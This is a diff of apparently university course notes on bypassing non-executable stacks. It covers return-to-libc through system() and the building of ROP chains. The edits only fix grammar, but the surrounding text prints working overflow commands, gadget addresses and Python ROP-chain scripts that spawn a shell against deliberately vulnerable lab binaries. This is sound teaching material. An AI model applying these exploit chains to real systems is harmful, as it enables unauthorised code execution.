@@ -4,11 +4,11 @@
 
 So far, in all of our exploits on the stack, we've been assuming that
 the memory mapped for the stack is set to be executable. That is, we
-would overwrite the return address and the have it jump somewhere else
+would overwrite the return address and then have it jump somewhere else
 on the stack (say to our shell code) and that code would execute.
 
 This setting is *not* the common setting for modern machines. There is a
-principle called "Write xor Execute" or *w* ⊗ *x* which states that a
+principle called "Write xor Execute" or *w* ⊗ *x* which states that a
 memory page should either be writable or executable but not both.
 
 What does this mean in practice? Let's take a look at our dummy exploit
@@ -29,7 +29,7 @@ int main(int argc, char *argv[]){
 }
 ```
 
-And we were to compile with our standard options:
+And if we were to compile with our standard options:
 
 ``` example
 gcc -fno-stack-protector -z execstack -Wno-format-security dummy_exploit.c   -o dummy_exploit
@@ -94,8 +94,8 @@ user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
 Segmentation fault (core dumped)
 ```
 
-Now we do not get a shell, but instead we get a segmentation fault. If
-we run this under gdb to look at the maps, the permissions has changed.
+Now we do not get a shell, but instead, we get a segmentation fault. If
+we run this under gdb to look at the maps, the permissions have changed.
 
 ``` example
 gdb) br main
@@ -129,7 +129,7 @@ user@si485H-base:demo$ exit
 (gdb) quit
 ```
 
-The challenge now is, how do we still exploit programs that uses
+The challenge now is, how do we still exploit programs that use
 write-xor-execute principles? The answer is, we do not inject our own
 shell code anymore, but we rather use the code that already exists and
 is already executable to do the job for us.
@@ -143,7 +143,7 @@ do our bidding. Namely, we'll focus on the C library function
 
 The `system()` library function takes a string as input and will execute
 that string via `execve`. This can be very useful, and very
-dangerous.Consider the following program:
+dangerous. Consider the following program:
 
 ``` c
 #include <stdio.h>
@@ -168,7 +168,7 @@ can't we overwrite a return address to jump there?
 
 ## Overwriting Return Addresses with `system()`
 
-For this example, we'll work the vulnerable program we've been using so
+For this example, we'll work on the vulnerable program we've been using so
 far in class:
 
 ``` c
@@ -205,7 +205,7 @@ the C standard library, and will include all the goodies we need for
 this exploit, namely, the `system()` function.
 
 The first thing we need to do is determine *where* the `system()` call is
-loaded. Here's running this on a 32-bit installation of Ubuntu linux.
+loaded. Here's running this on a 32-bit installation of Ubuntu Linux.
 
 ``` example
 (gdb) br main
@@ -219,8 +219,8 @@ Breakpoint 1, main (argc=1, argv=0xbffff734) at vulnerable.c:29
 $1 = {<text variable, no debug info>} 0xb7e5a190 <__libc_system>
 ```
 
-So at address 0xb735a190 is the start of the system., and we could use that in
-our exploit. But **NEW THIS YEAR** on our 64-bit linux machines, when I looked
+Address, 0xb735a190 is the start of the system, and we could use that in
+our exploit. But **NEW THIS YEAR** on our 64-bit Linux machines when I looked
 up the address of `system()` something interesting occurred:
 
 ``` example
@@ -229,11 +229,11 @@ $1 = {<text variable, no debug info>} 0xf7e26200 <system>
 ```
 
 Note that the address `0xf7e26200` contains a null byte! That's really
-problematic. Maybe, someone in the linux community changed the way libc compiled
+problematic. Maybe, someone in the Linux community changed the way libc compiled
 to make it more difficult to do this attack? Maybe it was just dumb luck? Either
 way, we need to find a workaround. 
 
-One thing to consider is that there's nothing requiring us to jump exactly to
+One thing to consider is that nothing is requiring us to jump exactly to
 `0xf7e26200`, we could jump earlier or later, as long as we get the same
 functionality. Let's look closer at the code for `system()`
 
@@ -258,7 +258,7 @@ system call. We could consider this in priming our exploit, but it would be a
 lot better if we can just blindly return-2-libc without having to do more offset
 calculations and whatnot.
 
-What about subtracting from the start of system, how does the instructions
+What about subtracting from the start of system, how do the instructions
 change?
 
 ``` example
@@ -310,8 +310,8 @@ change?
 
 After subtracting 1 byte, we can see that we get a valid set of instructions,
 but due to the non-risc nature of x86 (remember it is a complex instruction
-set), the offsets change of the instructions, mangling the call. However, if we
-keep stepping backwards, eventually, after 4 bytes, we get a valid instruction
+set), the offsets change the instructions, mangling the call. However, if we
+keep stepping backward, after 4 bytes, we get a valid instruction
 sequence whereby the instructions of system are unchanged. 
 
 So what if we jump to `0xf7e261fc`? This is a `lea` and so it's just
@@ -322,7 +322,7 @@ address for `system()`.
 
 ## Jumping to system
 
-Let's try and use that in our exploit. First, we need to setup the exploit, and
+Let's try and use that in our exploit. First, we need to set up the exploit, and
 we'll do that in the normal way.
 
 We can find the length of the buffer to the exploit:
@@ -354,7 +354,7 @@ We can find the length of the buffer to the exploit:
  804851f:   c3                      ret    
 ```
 
-Then we can setup the overflow:
+Then we can set up the overflow:
 
 ``` example
 user@si485H-base:demo$ ./vulnerable 10 `python -c "import struct; print 'A'*(0x2c+4)+struct.pack('<I',0xf7e261fc)"`
@@ -369,8 +369,8 @@ reporting the error. Essentially, we were successful in getting
 command. But, what was it?
 
 Look more closely, you'll see it is a bunch of our A's: it's the input
-we provided to the program. So we can control what get's called to it,
-and moreover, the system() command accepts valid bash directives. so we
+we provided to the program. So we can control what gets called to it,
+and the system() command accepts valid bash directives. so we
 can do the following:
 
 ``` example
@@ -382,8 +382,8 @@ And, boom shell!
 
 What we did, is we inserted a "/bin/sh;" at the start
 of our input string so that it will execute the shell. But there is
-still a bunch of A's to follow that will cause an error, and exiting the
-program, does just that:
+still, a bunch of A's to follow that will cause an error, and exiting the
+program does just that:
 
 ``` example
 $ 
@@ -394,7 +394,7 @@ Segmentation fault (core dumped)
 ## Why this worked so easily
 
 In our example, we got really lucky, because we control the argument to
-`/bin/sh`. Let's take a look at the disassemble of `vuln`:
+`/bin/sh`. Let's take a look at the disassembly of `vuln`:
 
 ``` example
 Dump of assembler code for function vuln:
@@ -425,7 +425,7 @@ End of assembler dump.
 ```
 
 If you look at the stack alignment at this point, we get the following
-for the vulnerable function prior to the leave/ret:
+for the vulnerable function before the leave/ret:
 
 ``` example
          .---------.
@@ -441,7 +441,7 @@ for the vulnerable function prior to the leave/ret:
  esp ->  '---------'    eip: vuln+73
 ```
 
-After the leave/return we are left with this:
+After the leave/return, we are left with this:
 
 ``` example
 
@@ -473,7 +473,7 @@ We can further look at the code for system:
 Note that at the return to system from the vulnerable program, the address of
 our input string should be at `$esp+0x4`. The `sub esp,0xc` instruction moves
 the stack such that `$esp+0x10` and that's set to `$eax` for the remainder of
-the functions. It just works out ... remember this alignment for latter when we
+the functions. It just works out ... remember this alignment for later when we
 do ROP.
 
 
@@ -599,7 +599,7 @@ Boom shell!
 Another option is to write an address to the stack where `system()` will
 use it as its argument. Consider that we have control of the stack at
 this point, and we can write arbitrarily to the stack, so the question
-is, what address do we write? Why not jump to the exploit string itself.
+is, what address do we write? Why not jump to the exploit string itself?
 
 Consider this version of the exploit again this time, I'm going to use
 0xdeadbeef for the address of system and then 0xcafebabe for the address
@@ -615,7 +615,7 @@ user@si485H-base:demo$ dmesg | tail -1
 
 After the return/leave, the segfault occurs revealing the stack pointer
 at the time of the exploit, and this is EXACTLY the information we need
-in order to calculate the address of the start of the exploit string
+to calculate the address of the start of the exploit string
 where "/bin/sh;" lives.
 
 Consider again, that after the return and leave, the stack looks like
@@ -644,7 +644,7 @@ Looking at the exploit closely, you see that `esp` references the "BBBB"
 following the exploit, we see that this address is exactly 0x28+8 bytes
 away from the start of the exploit string. We know this because the
 return address was 0x28+4 bytes away, and this is four bytes beyond
-that. That means, if we replace 0xcafebabe with
+that. That means if we replace 0xcafebabe with
 0xbffff690-0x28-8=0xbffff660, we should get the exploit we want. Let's
 give it a try:
 
@@ -688,29 +688,27 @@ So while we didn't get the first one, we eventually found a "/bin/sh".
 
 # Return Oriented Programming: Function Chaining Gadgets
 
-Return Oriented Programming or (ROP) is the process of using small
+Return Oriented Programming (ROP) is the process of using small
 sequences of code (or gadgets) that are embedded in other code. The
 "return" portion of the code comes from the fact that these small pieces
 of code, or gadgets, all end with a return statement. The concept is
-that while there may be protections in places to stop you from loading
+that while there may be protections in place to stop you from loading
 shell code, we can leverage the code already within our target program.
 
-As an additional benefit for ROP, similar to the benefit from
-return-2-libc, is that there a ROP chain is functional even when the
+An additional benefit for ROP, similar to the benefit from
+return-2-libc, is that a ROP chain is functional even when the
 stack memory is labeled non-executable and there is memory address
 randomization. The reason is that we are only going to use already
 existing code to build an exploit, namely code that is in the .text
 segment, so it is already labeled executable. Moreover, the .text
 segment isn't randomized with ASLR, so it will *always* be consistently
 in the same place. This means this style of attack is really powerful
-and really consistent.
+and consistent.
 
-Below, we follow an example using of ROP where we use it to properly
+Below, we follow an example using ROP to properly
 chain function calls together, but we will also look at an example where
 the ROP itself, without calling any other function, is capable of
-launching a shell. Also note, that ll the code we are working with in
-this lesson are compiled *without* executable stacks, so we can't easily
-load shell code [1].
+launching a shell. Also note, that all the code in this lesson is compiled *without* executable stacks, so we can't easily load shell code [1].
 
 ## Overwriting the return address with function calls
 
@@ -741,8 +739,8 @@ void main(int argc, char * argv[]){
 }
 ```
 
-We know how to solve this one: we overflow the buffer and we overwrite
-the return the address for vuln() with bad(). To do this, first we can
+We know how to solve this one: we overflow the buffer and overwrite
+the return the address for vuln() with bad(). First, we can
 look at the disassembled code to see where the buffer is declared into
 relation to the return address:
 
@@ -788,8 +786,8 @@ Segmentation fault (core dumped)
 
 ## Functions with Arguments
 
-We can make the exploit a little more intriguing if we were to make so
-that bad() will call system() with it's argument:
+We can make the exploit a little more intriguing if we were to make it so
+that bad() will call system() with its argument:
 
 ``` c
 #include <stdio.h>
@@ -898,7 +896,7 @@ void main(int argc, char * argv[]){
 ```
 
 This time we need to first call bin<sub>sh</sub>() with magicbeef being
-deadbeef and then we need to call bad() afterwards to get our shell.
+deadbeef and then we need to call bad() afterward to get our shell.
 This might seem like no problem, at first, but once we try it out,
 you'll see where the challenge arises.
 
@@ -912,7 +910,7 @@ properly call bin<sub>sh</sub>:
 ```
 
 We overwrite the return address of vuln() with the address of
-bin<sub>sh</sub>() where it's arguments is 0xdeadbeef. Before, in the
+bin<sub>sh</sub>() where its argument is 0xdeadbeef. In the
 last example, we didn't consider the return address of the function we
 jumped to, but this time we have to. What is the next function we call?
 bad(). So what we really need for the stack is to look like this.
@@ -958,7 +956,7 @@ this.
 
 ``` example
 |     <addr pwn>        |
-|      0xdeadbeef       | <-- bad's return addres is bin_sh's argument
+|      0xdeadbeef       | <-- bad's return address is bin_sh's argument
 |     <addr bad>        |
 |     <addr bin_sh>     |
 ```
@@ -1019,7 +1017,7 @@ the functions requires *two* arguments. Looks like our luck ran out and
 this is impossible, but just in case, let's try looking at the stack
 anyway.
 
-Starting with the first function add<sub>bin</sub> and it's two
+Starting with the first function add<sub>bin</sub> and its two
 arguments which should be followed by `add_sh`, we'd need something like
 this:
 
@@ -1031,7 +1029,7 @@ this:
 ```
 
 That's possible, but then what happens: we've reached an impasse.
-add<sub>sh</sub>() takes one argument and the way the stack is alligned,
+add<sub>sh</sub>() takes one argument and the way the stack is aligned,
 that argument is 0x0badf00d. That's just not what we need --- we need
 0xdeadbeef.
 
@@ -1065,7 +1063,7 @@ We've been doing a bit of return oriented programming already, but now
 we really get into it. The big idea was to chain a bunch of functions
 together through their return address to complete a task. That is a form
 of return oriented programming, but now we need something different. We
-need a very specific kind of an expression, a `pop;popl;ret` which is
+need a very specific kind of expression, a `pop;popl;ret` which is
 not a typical function that we can write. How do we find such a thing?
 
 The answer lies in the code itself. While we as programmers of C will
@@ -1115,9 +1113,9 @@ user@si485H-base:demo$ objdump -d -M intel call_bad_doublechain | grep -B 3  ret
 The search terms above looked for any return statement, printing the 3
 previous lines. Then the following grep searched for a pop statement,
 printing the 3 lines after. The result, above, shows us where there is
-instance of a `pop;pop;ret;`, at address 0x08048508. What is also
-important with this gadget is that we don't care to where the data is
-being popped, to any of the registers is fine, as long as it is being
+an instance of a `pop;pop;ret;`, at address 0x08048508. What is also
+important with this gadget is that we don't care where the data is
+being popped to, any of the registers is fine, as long as it is being
 popped off the stack.
 
 ## Using the gadget
@@ -1281,9 +1279,9 @@ string we choose.
 
 # Building a ROP chain from scratch
 
-The first thing we need to do in order to build a ROP chain is to find
-gadgets. First we will look at doing this manually by searching for
-gadgets using `objdump` and `grep`. Latter we'll look at doing this in a
+The first thing we need to do to build a ROP chain is to find
+gadgets. First, we will look at doing this manually by searching for
+gadgets using `objdump` and `grep`. Later we'll look at doing this in a
 more automated fashion.
 
 ## Finding Some Useful Gadgets
@@ -1330,7 +1328,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | head -3
 
 These are all usable gadgets because they allow us to set registers
 arbitrarily by popping something off the stack into a register. In
-genreal, there are going to be three really useful kinds of gadgets
+general, there are going to be three really useful kinds of gadgets
 which we will need to find:
 
 -   pop reg : this will allow us to control the value in a register
@@ -1389,8 +1387,8 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A
 --
 ```
 
-Now we have everything we need except a place to write too. For that we
-can use any old place in the data segment. Turns out 0x080ea060 is
+Now we have everything we need except a place to write to. For that, we
+can use any old place in the data segment. It turns out 0x080ea060 is
 perfect for that.
 
 ## Write an "A\\0" to memory ROP chain
@@ -1411,13 +1409,13 @@ It should look something like this:
  |  | <pop edx; ret>      |  store next value in edx
 ```
 
-Reading from bottom to top up the stack. First we move the address we
+Reading from bottom to top up the stack. First, we move the address we
 want to write to into edx with a pop, then similarly we move a bunch of
 A's into eax. Then we can write to the address edx the A's in eax. Once
 we zero out eax and write that to the next byte, we should have the
 string "A\\0" at address 0x080ea061.
 
-Let's find the right gadgets. First we need `pop edx;ret`:
+Let's find the right gadgets. First, we need `pop edx;ret`:
 
 ``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*edx" 
@@ -1448,7 +1446,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A
 --
 ```
 
-The last thin we need is `xor` eax command:
+The last thing we need is `xor` eax command:
 
 ``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 1 ret | grep -A 1 "xor.*eax,eax" 
@@ -1475,14 +1473,14 @@ This means we can put together the chain like so:
 ```
 
 Notice the `0xdeadbeef`. This is because the gadget to set eax comes
-with some added bagage, namely a bunch of extra pop's that have to be
+with some added baggage, namely a bunch of extra pop's that have to be
 handled. These pop's will clear the stack of values, so we need to add
 some values on the stack, 0xdeadbeef's, so we don't interfere with the
 rest of the chain.
 
 ## Executing the ROP Chain
 
-One problem with ROP chains is that they are long, much longer then
+One problem with ROP chains is that they are long, much longer than
 something we can just casually type on the command line. It then makes
 sense to store it in a file, and python is the right tool for the job.
 
@@ -1506,8 +1504,8 @@ print p
 ```
 
 Note that the `pack('<I',0xdeadbeef)` will create a properly formatted
-little Endian string of 0xdeadbeef. Also note that we built the exploit
-string in reverse order from the presentation above. I also places a
+little Endian string of 0xdeadbeef. Also, note that we built the exploit
+string in reverse order from the presentation above. I also place a
 0xcafebabe in there so we can know if we segfaulted and reached the end
 of our ropchain, so let's try it out and see if we get there:
 
@@ -1522,12 +1520,12 @@ user@si485H-base:demo$ dmesg | tail -1
 Hmm. It did not work, why? Well look closely a the `ip` we segfaulted on
 0xbf00e080. There is a null byte in there, and also that looks a lot
 like the address for our `pop eax; pop ebx; pop esi; pop edi; ret;` at
-0x0809e080. The 0x098 did not wite onto the stack, and the reason for
+0x0809e080. The 0x098 did not write onto the stack, and the reason for
 that is 0x09 is '\\t' (tab) and that terminated the `strcpy()`.
 
-It turns out that not all of our gadgets that we find can be used
+It turns out that not all of our gadgets can be used
 because the address may contain values we can't include in the overflow.
-Looks like we need to hunt for more gadgets!
+It looks like we need to hunt for more gadgets!
 
 ## Gadgets within Other Operations
 
@@ -1535,7 +1533,7 @@ One thing we can leverage here is that x86 is not a fixed size
 instruction set. Instead, any sequence of bytes could be a valid
 instruction. Before, the address of `pop eax` gadget was at an address
 that was not useful, but we can look for another one that might be
-embeded elsehwere.
+embedded elsewhere.
 
 To start, it is worthwhile to know that byte 0xc3 is the return
 operation and address 0x58 is the `pop eax` instruction. In that case,
@@ -1549,7 +1547,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  |  grep -B 2 "c3" | grep 
 (...)
 ```
 
-And there, within that mov instruction, we see that there is a 0x58
+Within that mov instruction, we see that there is a 0x58
 followed by a 0xc3. That means we can use address 0x080bb746 in our ROP
 chain. Now we can use the following rop chain:
 
@@ -1593,7 +1591,7 @@ work to install it on your own virtual box system.
 
 While ROPgadget does all sorts of cool things, we'll primarily use it to
 find gadgets for us. Here's the most basic usage where I am just
-seperating out the pop eax instructions:
+separating out the pop eax instructions:
 
 ``` example
 user@si485H-base:demo$ ./ROPgadget.py --binary ./vulnerable | grep ": pop eax "
@@ -1674,7 +1672,7 @@ And if we run this, we see we segfault on cafebabe, hurray!
 ``` example
 user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
-                                                                                                                        AAAAﾭ?zaﾭ޾???
+                                                                                                                        AAAAﾭ?zaﾭ???
 Segmentation fault (core dumped)
 user@si485H-base:demo$ dmesg | tail -1
 [1560517.099344] vulnerable[10793]: segfault at cafebabe ip cafebabe sp bffff64c error 15
@@ -1719,7 +1717,7 @@ p += pack('<I', 0xffffffff)# set edx to 0xfffffff
 p += pack('<I', 0x0805d0e7)# : inc edx ; ret
 p += pack('<I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)
 
-#call interupt
+#call interrupt
 p += pack('<I', 0x0806f040) # int 0x80; ret
 
 p += pack('<I', 0xcafebabe) # <-- segfault here
@@ -1826,7 +1824,7 @@ def print_char():
     p += pack('<I', 0x0805d0e7)# : inc edx ; ret
     p += pack('<I', 0x0805d0e7)# : inc edx ; ret (now edx is 0x1)
 
-    #call interupt
+    #call interrupt
     p += pack('<I', 0x0806f040) # int 0x80; ret
     return p
 
@@ -1888,7 +1886,7 @@ user@si485H-base:demo$ dmesg | tail -1
 
 ## Launching a shell
 
-We actually have everything we need to also launch a shell. It is the
+We have everything we need to also launch a shell. It is the
 same as writing an 'A' but now we also have to set up the other
 registers slightly differently. Recall, this is what we need:
 
@@ -1949,7 +1947,7 @@ p += pack('<I', 0x0806e97a)# pop edx ; ret
 p += pack('<I', 0xffffffff)# set edx to 0xfffffff
 p += pack('<I', 0x0805d0e7)# : inc edx ; ret
 
-#call interupt
+#call interrupt
 p += pack('<I', 0x0806f040) # int 0x80; ret
 
 print p
